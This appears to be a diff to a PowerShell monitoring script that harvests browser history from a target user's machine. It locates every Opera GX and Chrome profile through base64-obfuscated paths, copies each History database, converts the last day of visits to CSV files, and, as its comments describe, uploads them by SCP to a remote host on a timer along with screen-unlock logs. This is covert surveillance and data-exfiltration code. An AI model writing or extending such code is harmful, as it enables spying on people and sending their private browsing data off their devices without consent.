@@ -7,7 +7,7 @@ $script:ScpBHistoryIntervalMinutes = 5
 $script:LastBHistoryMissingWarnUtc = $null
 $script:LastBHistorySourceWriteUtc = $null
 $script:LastBHistoryScpSucceeded = $false
-# Per staged leaf (log-history-op / log-history-ch): WriteUtc + Succeeded.
+# Per staged leaf (log-history-op-<profile> / log-history-ch-<profile>): WriteUtc + Succeeded.
 $script:LastBHistoryStateByLeaf = @{}
 # Directory of this helper while it is being dot-sourced (src/ under install or repo).
 $script:ScpOnLockScriptDir = $PSScriptRoot
@@ -45,11 +45,13 @@ $script:ScpBHistoryLocalRels = @(
     (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1hccHJvZmlsZVxIaXN0b3J5')
     (ConvertFrom-ScpB64Path 'UHJvZ3JhbXNcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1hcSGlzdG9yeQ==')
 )
-# Relative paths under AppData\Local for the second family.
-$script:ScpBHistorySecondaryLocalRels = @(
-    (ConvertFrom-ScpB64Path 'R29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxIaXN0b3J5')
-    (ConvertFrom-ScpB64Path 'R29vZ2xlXENocm9tZVxVc2VyIERhdGFcUHJvZmlsZSAxXEhpc3Rvcnk=')
-    (ConvertFrom-ScpB64Path 'R29vZ2xlXENocm9tZVxVc2VyIERhdGFcSGlzdG9yeQ==')
+# Secondary (ch) User Data root under AppData\Local (all profiles scanned for History).
+$script:ScpBHistoryChUserDataRel = ConvertFrom-ScpB64Path 'R29vZ2xlXENocm9tZVxVc2VyIERhdGE='
+# Primary (op) product roots under AppData\Roaming and AppData\Local (all profiles scanned).
+$script:ScpBHistoryOpProductRels = @(
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1g=')
+    (ConvertFrom-ScpB64Path 'T3BlcmEgR1ggU3RhYmxl')
 )
 # paths relative to a browser install directory.
 $script:ScpBHistoryInstallRels = @(
@@ -617,9 +619,241 @@ function Resolve-BHistoryPathForFamily {
     return ''
 }
 
+function Get-BHistoryStageLeafSafeName {
+    <#
+      Sanitize a browser profile directory name for use in StageLeaf.
+      Spaces become '-' (Profile 1 -> Profile-1).
+    #>
+    param([Parameter(Mandatory)][string]$Name)
+
+    $s = $Name.Trim()
+    if ([string]::IsNullOrWhiteSpace($s)) {
+        return 'unknown'
+    }
+    foreach ($ch in [System.IO.Path]::GetInvalidFileNameChars()) {
+        $s = $s.Replace([string]$ch, '_')
+    }
+    # Replace remaining whitespace with '-' (e.g. Profile 1 -> Profile-1).
+    $s = [regex]::Replace($s, '\s+', '-')
+    return $s
+}
+
+function New-BHistoryRootAccumulator {
+    <#
+      Unique existing directory collector (Roots + Seen). Use Add-BHistoryRootPath.
+    #>
+    return [pscustomobject]@{
+        Roots = New-Object System.Collections.Generic.List[string]
+        Seen  = New-Object 'System.Collections.Generic.HashSet[string]' `
+            ([StringComparer]::OrdinalIgnoreCase)
+    }
+}
+
+function Add-BHistoryRootPath {
+    <#
+      Add an existing directory to a New-BHistoryRootAccumulator (deduped).
+    #>
+    param(
+        [Parameter(Mandatory)]$Accumulator,
+        [string]$Path
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Path)) { return }
+    if (-not (Test-Path -LiteralPath $Path -PathType Container)) { return }
+    try {
+        $full = [System.IO.Path]::GetFullPath($Path)
+    }
+    catch {
+        $full = $Path
+    }
+    if ($Accumulator.Seen.Add($full)) {
+        $Accumulator.Roots.Add($full)
+    }
+}
+
+function Add-BHistoryProductRootFromPreferredHistory {
+    <#
+      If PreferredAbsolute ends with ...\<profile>\History, add the product root
+      (parent of the profile directory).
+    #>
+    param(
+        [string]$PreferredAbsolute,
+        [Parameter(Mandatory)]$Accumulator
+    )
+
+    if ([string]::IsNullOrWhiteSpace($PreferredAbsolute)) { return }
+    if (-not ([string](Split-Path -Leaf $PreferredAbsolute)).Equals(
+            'History', [StringComparison]::OrdinalIgnoreCase)) {
+        return
+    }
+    $profileDir = Split-Path -Parent $PreferredAbsolute
+    if ([string]::IsNullOrWhiteSpace($profileDir)) { return }
+    Add-BHistoryRootPath -Accumulator $Accumulator -Path (Split-Path -Parent $profileDir)
+}
+
+function Get-ProfileHistorySourcesFromRoots {
+    <#
+      Scan product/User Data roots for profile History DBs.
+      StageLeaf = <StagePrefix>-<safe_profile_name>.
+      When IncludeRootHistory is set, also pick History sitting directly under the root
+      (legacy product-root History) as <StagePrefix>-Default if that leaf is free.
+    #>
+    param(
+        [string[]]$Roots = @(),
+        [Parameter(Mandatory)][string]$StagePrefix,
+        [bool]$IncludeRootHistory = $false
+    )
+
+    $sources = New-Object System.Collections.Generic.List[object]
+    $seenHist = New-Object 'System.Collections.Generic.HashSet[string]' `
+        ([StringComparer]::OrdinalIgnoreCase)
+    $usedLeaves = New-Object 'System.Collections.Generic.HashSet[string]' `
+        ([StringComparer]::OrdinalIgnoreCase)
+
+    $addHist = {
+        param([string]$HistPath, [string]$ProfileName)
+        if ([string]::IsNullOrWhiteSpace($HistPath)) { return }
+        if (-not (Test-Path -LiteralPath $HistPath -PathType Leaf)) { return }
+        try {
+            $full = [System.IO.Path]::GetFullPath($HistPath)
+        }
+        catch {
+            $full = $HistPath
+        }
+        if (-not $seenHist.Add($full)) { return }
+
+        $safe = Get-BHistoryStageLeafSafeName -Name $ProfileName
+        $leaf = '{0}-{1}' -f $StagePrefix, $safe
+        if (-not $usedLeaves.Add($leaf)) {
+            $n = 2
+            while (-not $usedLeaves.Add(('{0}-{1}' -f $leaf, $n))) {
+                $n++
+            }
+            $leaf = '{0}-{1}' -f $leaf, $n
+        }
+        $sources.Add([pscustomobject]@{
+                Path      = $full
+                StageLeaf = $leaf
+            })
+    }
+
+    foreach ($root in @($Roots)) {
+        if ([string]::IsNullOrWhiteSpace([string]$root)) { continue }
+        if (-not (Test-Path -LiteralPath $root -PathType Container)) { continue }
+
+        if ($IncludeRootHistory) {
+            & $addHist (Join-Path $root 'History') 'Default'
+        }
+
+        Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue |
+            ForEach-Object {
+                & $addHist (Join-Path $_.FullName 'History') ([string]$_.Name)
+            }
+    }
+
+    return $sources.ToArray()
+}
+
+function Get-ChBHistoryUserDataRoots {
+    <#
+      Candidate secondary (ch) User Data directories for the target user
+      (Local AppData, preferred absolute parent, install-dir User Data).
+    #>
+    param([string]$TargetUsername = '')
+
+    $acc = New-BHistoryRootAccumulator
+    Add-BHistoryProductRootFromPreferredHistory `
+        -PreferredAbsolute ([string]$script:ScpBHistoryPreferredAbsoluteSecondary) `
+        -Accumulator $acc
+
+    if (-not [string]::IsNullOrWhiteSpace($TargetUsername)) {
+        $profile = Get-TargetUserProfilePath -TargetUsername $TargetUsername
+        $local = Join-Path $profile 'AppData\Local'
+        if (-not [string]::IsNullOrWhiteSpace([string]$script:ScpBHistoryChUserDataRel)) {
+            Add-BHistoryRootPath -Accumulator $acc `
+                -Path (Join-Path $local ([string]$script:ScpBHistoryChUserDataRel))
+        }
+
+        $installRoots = @(Get-BHistoryInstallRootPaths `
+                -ProfilePath $profile `
+                -InstallDirLeaves @($script:ScpBHistorySecondaryInstallDirLeaves))
+        foreach ($installRoot in $installRoots) {
+            Add-BHistoryRootPath -Accumulator $acc -Path (Join-Path $installRoot 'User Data')
+        }
+    }
+
+    return $acc.Roots.ToArray()
+}
+
+function Get-ChBHistorySources {
+    <#
+      Every secondary (ch) profile History DB under discovered User Data roots.
+      StageLeaf = log-history-ch-<profile_dir_name> (e.g. log-history-ch-Default,
+      log-history-ch-Profile-1).
+    #>
+    param([string]$TargetUsername = '')
+
+    return @(Get-ProfileHistorySourcesFromRoots `
+            -Roots @(Get-ChBHistoryUserDataRoots -TargetUsername $TargetUsername) `
+            -StagePrefix 'log-history-ch' `
+            -IncludeRootHistory:$false)
+}
+
+function Get-OpBHistoryUserDataRoots {
+    <#
+      Candidate primary (op) product directories (Roaming/Local + preferred + install).
+      Profiles (Default, Profile 1, …) live under these roots.
+    #>
+    param([string]$TargetUsername = '')
+
+    $acc = New-BHistoryRootAccumulator
+    Add-BHistoryProductRootFromPreferredHistory `
+        -PreferredAbsolute ([string]$script:ScpBHistoryPreferredAbsolute) `
+        -Accumulator $acc
+
+    if (-not [string]::IsNullOrWhiteSpace($TargetUsername)) {
+        $profile = Get-TargetUserProfilePath -TargetUsername $TargetUsername
+        $roaming = Join-Path $profile 'AppData\Roaming'
+        $local = Join-Path $profile 'AppData\Local'
+        foreach ($rel in @($script:ScpBHistoryOpProductRels)) {
+            if ([string]::IsNullOrWhiteSpace([string]$rel)) { continue }
+            Add-BHistoryRootPath -Accumulator $acc -Path (Join-Path $roaming ([string]$rel))
+            Add-BHistoryRootPath -Accumulator $acc -Path (Join-Path $local ([string]$rel))
+        }
+
+        $installRoots = @(Get-BHistoryInstallRootPaths `
+                -ProfilePath $profile `
+                -InstallDirLeaves @($script:ScpBHistoryInstallDirLeaves))
+        foreach ($installRoot in $installRoots) {
+            # Install tree may hold profile\History or Default\History.
+            Add-BHistoryRootPath -Accumulator $acc -Path $installRoot
+            Add-BHistoryRootPath -Accumulator $acc -Path (Join-Path $installRoot 'profile')
+        }
+    }
+
+    return $acc.Roots.ToArray()
+}
+
+function Get-OpBHistorySources {
+    <#
+      Every primary (op) profile History DB under discovered product roots.
+      StageLeaf = log-history-op-<profile_dir_name> (e.g. log-history-op-Default,
+      log-history-op-Profile-1). Legacy History directly under the product root
+      is included as log-history-op-Default when present.
+    #>
+    param([string]$TargetUsername = '')
+
+    return @(Get-ProfileHistorySourcesFromRoots `
+            -Roots @(Get-OpBHistoryUserDataRoots -TargetUsername $TargetUsername) `
+            -StagePrefix 'log-history-op' `
+            -IncludeRootHistory:$true)
+}
+
 function Get-BHistorySources {
     <#
-      All discoverable History DBs for the target user (one per family).
+      All discoverable History DBs for the target user:
+        - every primary (op) profile History as log-history-op-<profile_name>
+        - every secondary (ch) profile History as log-history-ch-<profile_name>
       Returns objects: Path, StageLeaf (remote/temp file name).
     #>
     param(
@@ -628,30 +862,11 @@ function Get-BHistorySources {
 
     $sources = New-Object System.Collections.Generic.List[object]
 
-    $primary = Resolve-BHistoryPathForFamily `
-        -TargetUsername $TargetUsername `
-        -PreferredAbsolute ([string]$script:ScpBHistoryPreferredAbsolute) `
-        -RoamingRels @($script:ScpBHistoryRoamingRels) `
-        -LocalRels @($script:ScpBHistoryLocalRels) `
-        -InstallDirLeaves @($script:ScpBHistoryInstallDirLeaves)
-    if (-not [string]::IsNullOrWhiteSpace($primary)) {
-        $sources.Add([pscustomobject]@{
-                Path      = $primary
-                StageLeaf = 'log-history-op'
-            })
+    foreach ($op in @(Get-OpBHistorySources -TargetUsername $TargetUsername)) {
+        $sources.Add($op)
     }
-
-    $secondary = Resolve-BHistoryPathForFamily `
-        -TargetUsername $TargetUsername `
-        -PreferredAbsolute ([string]$script:ScpBHistoryPreferredAbsoluteSecondary) `
-        -RoamingRels @() `
-        -LocalRels @($script:ScpBHistorySecondaryLocalRels) `
-        -InstallDirLeaves @($script:ScpBHistorySecondaryInstallDirLeaves)
-    if (-not [string]::IsNullOrWhiteSpace($secondary)) {
-        $sources.Add([pscustomobject]@{
-                Path      = $secondary
-                StageLeaf = 'log-history-ch'
-            })
+    foreach ($ch in @(Get-ChBHistorySources -TargetUsername $TargetUsername)) {
+        $sources.Add($ch)
     }
 
     # Do not wrap with unary comma: callers use @() and a wrapped array
@@ -713,10 +928,10 @@ function Copy-FileWithSharedRead {
 function New-ScpBHistoryUploadFiles {
     <#
       Stages shared-read copies of each discovered History DB under TEMP
-      (log-history-op, log-history-ch, ...). Returns staged full paths.
-      Caller must delete returned paths when finished.
-      When TargetUsername is empty, still stages preferred absolute History
-      paths (profile-relative discovery is skipped).
+      (log-history-op-<profile>, log-history-ch-<profile>, ...). Returns staged
+      full paths. Caller must delete returned paths when finished.
+      When TargetUsername is empty, stages every op/ch profile under
+      preferred/discovered product roots.
     #>
     param([string]$TargetUsername = '')
 
@@ -729,18 +944,17 @@ function New-ScpBHistoryUploadFiles {
         }
     }
     else {
-        # Preferred absolute paths only (no profile-relative lookup).
-        foreach ($pair in @(
-                @{ Abs = [string]$script:ScpBHistoryPreferredAbsolute; Leaf = 'log-history-op' }
-                @{ Abs = [string]$script:ScpBHistoryPreferredAbsoluteSecondary; Leaf = 'log-history-ch' }
-            )) {
-            if (-not [string]::IsNullOrWhiteSpace($pair.Abs) -and (Test-Path -LiteralPath $pair.Abs)) {
-                $sources.Add([pscustomobject]@{ Path = $pair.Abs; StageLeaf = $pair.Leaf })
-            }
+        foreach ($op in @(Get-OpBHistorySources -TargetUsername '')) {
+            $sources.Add($op)
+        }
+        foreach ($ch in @(Get-ChBHistorySources -TargetUsername '')) {
+            $sources.Add($ch)
         }
     }
 
-    foreach ($src in @($sources)) {
+    # Do not wrap List[object] with @(): PowerShell throws "Argument types do
+    # not match" when the list holds PSCustomObject rows (breaks all staging).
+    foreach ($src in $sources) {
         $sourcePath = [string]$src.Path
         $leaf = [string]$src.StageLeaf
         if ([string]::IsNullOrWhiteSpace($sourcePath) -or [string]::IsNullOrWhiteSpace($leaf)) {
@@ -828,11 +1042,28 @@ function Get-BHistoryCsvDirectory {
     return $dir
 }
 
+function Test-BHistoryStagedLeafName {
+    <#
+      True for log-history-op / log-history-op-<profile> / log-history-ch-<profile>.
+    #>
+    param([string]$Leaf)
+
+    if ([string]::IsNullOrWhiteSpace($Leaf)) { return $false }
+    return ($Leaf -eq 'log-history-op') -or
+        ($Leaf -like 'log-history-op-*') -or
+        ($Leaf -like 'log-history-ch-*')
+}
+
 function New-BHistoryCsvExports {
     <#
-      Stage History DBs, run Convert-LogBhToCsv.ps1 -PreviousDays 1 for each,
-      and write LogDirectory\bhist\log-history-{op|ch}-YYYY-MM-DD.csv.
-      Returns paths of CSVs that exist after conversion (0-row exports omit files).
+      For every discovered op/ch profile History DB:
+        1) stage a shared-read copy
+        2) run Convert-LogBhToCsv.ps1 -PreviousDays 1
+        3) write LogDirectory\bhist\
+             log-history-op-<profile>-YYYY-MM-DD.csv
+             log-history-ch-<profile>-YYYY-MM-DD.csv
+      Returns all of today's dated CSVs under bhist (for SCP upload).
+      0-row converts omit/remove that profile's CSV by design.
       Temp staged SQLite copies are deleted before return.
     #>
     param([Parameter(Mandatory)]$Config)
@@ -849,9 +1080,17 @@ function New-BHistoryCsvExports {
     $day = Get-Date -Format 'yyyy-MM-dd'
     $staged = @()
     try {
-        if (-not [string]::IsNullOrWhiteSpace([string]$Config.TargetUsername)) {
-            $staged = @(New-ScpBHistoryUploadFiles -TargetUsername ([string]$Config.TargetUsername))
-        }
+        $staged = @(New-ScpBHistoryUploadFiles -TargetUsername ([string]$Config.TargetUsername))
+        $opStaged = @($staged | Where-Object {
+                $leaf = Split-Path -Leaf ([string]$_)
+                ($leaf -eq 'log-history-op') -or ($leaf -like 'log-history-op-*')
+            })
+        $chStaged = @($staged | Where-Object {
+                (Split-Path -Leaf ([string]$_)) -like 'log-history-ch-*'
+            })
+        Write-BHistoryCsvEvent -Message (
+            'BHistory CSV: staged {0} DB(s) (op={1}, ch={2}) for -PreviousDays 1.' -f `
+                $staged.Count, $opStaged.Count, $chStaged.Count)
         if ($staged.Count -eq 0) {
             Write-BHistoryCsvEvent -Level WARN -Message (
                 'BHistory CSV: no History DB could be staged for conversion.')
@@ -860,14 +1099,16 @@ function New-BHistoryCsvExports {
         foreach ($dbPath in $staged) {
             if ([string]::IsNullOrWhiteSpace([string]$dbPath)) { continue }
             $leaf = Split-Path -Leaf ([string]$dbPath)
-            if ($leaf -notmatch '^log-history-(op|ch)$') {
+            if (-not (Test-BHistoryStagedLeafName -Leaf $leaf)) {
                 continue
             }
+            # log-history-op-<profile>-YYYY-MM-DD.csv / log-history-ch-<profile>-YYYY-MM-DD.csv
             $outPath = Join-Path $bhistDir ('{0}-{1}.csv' -f $leaf, $day)
             $convertExit = -1
             try {
                 Write-BHistoryCsvEvent -Message (
-                    "BHistory CSV: converting {0} -> {1} (-PreviousDays 1)" -f $leaf, $outPath)
+                    "BHistory CSV: Convert-LogBhToCsv.ps1 -PreviousDays 1 ({0} -> {1})" -f `
+                        $leaf, $outPath)
                 # Capture success-stream noise from Convert/Python so it does not
                 # pollute this function's return value.
                 $convertOut = @(& $convertScript -InputPath ([string]$dbPath) `
@@ -902,15 +1143,30 @@ function New-BHistoryCsvExports {
             }
         }
 
-        # If conversion produced nothing this pass, still upload today's existing CSVs.
-        if ($csvPaths.Count -eq 0) {
-            foreach ($base in @('log-history-op', 'log-history-ch')) {
-                $existing = Join-Path $bhistDir ('{0}-{1}.csv' -f $base, $day)
-                if (Test-Path -LiteralPath $existing) {
-                    $csvPaths.Add($existing)
-                }
+        # Always upload every current-date CSV under bhist (all op/ch profiles).
+        $seenCsv = @{}
+        foreach ($existing in @($csvPaths)) {
+            if (-not [string]::IsNullOrWhiteSpace([string]$existing)) {
+                $seenCsv[[string]$existing.ToLowerInvariant()] = $true
             }
         }
+        if (Test-Path -LiteralPath $bhistDir) {
+            Get-ChildItem -LiteralPath $bhistDir -File -Force `
+                -Filter ('log-history-*-{0}.csv' -f $day) -ErrorAction SilentlyContinue |
+                Sort-Object Name |
+                ForEach-Object {
+                    $full = $_.FullName
+                    $key = $full.ToLowerInvariant()
+                    if (-not $seenCsv.ContainsKey($key)) {
+                        $seenCsv[$key] = $true
+                        $csvPaths.Add($full)
+                    }
+                }
+        }
+        Write-BHistoryCsvEvent -Message (
+            'BHistory CSV: {0} file(s) ready for SCP upload for {1}: {2}' -f `
+                $csvPaths.Count, $day, (
+                ($csvPaths | ForEach-Object { Split-Path -Leaf $_ }) -join ', '))
     }
     finally {
         foreach ($tempCopy in @($staged)) {
@@ -1347,10 +1603,12 @@ function Get-CurrentUnlockedTimeLogPath {
 function Invoke-ScpBHistoryCopy {
     <#
     .SYNOPSIS
-      Every interval: converts History DBs to dated CSVs under LogDirectory\bhist
-      (Convert-LogBhToCsv.ps1 -PreviousDays 1), SCPs those CSVs when present, and
-      uploads today's unlocked-time-*.log. Failures are logged; they do not stop
-      the monitor.
+      Every interval: for every op/ch browser profile History DB, run
+      Convert-LogBhToCsv.ps1 -PreviousDays 1 into
+      log-history-op-<profile>-YYYY-MM-DD.csv /
+      log-history-ch-<profile>-YYYY-MM-DD.csv under LogDirectory\bhist,
+      SCP all of today's those CSVs when present, and upload today's
+      unlocked-time-*.log. Failures are logged; they do not stop the monitor.
     #>
     param(
         [Parameter(Mandatory)]$Config
